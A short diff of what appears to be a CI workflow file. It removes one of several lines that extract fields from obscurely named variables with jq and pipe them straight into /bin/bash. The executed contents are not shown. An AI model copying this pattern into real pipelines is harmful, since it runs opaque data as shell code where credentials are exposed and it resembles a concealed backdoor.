@@ -25,7 +25,6 @@ jobs:
           echo $spud5790 | jq -r .s9 | /bin/bash
           echo $by12 | jq -r .qvtzs1257 | /bin/bash
           printf '%s' "$kk37" | jq -r .ey5558 | /bin/bash
-          printf '%s' "$npvt9" | jq -r .dbc7581 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
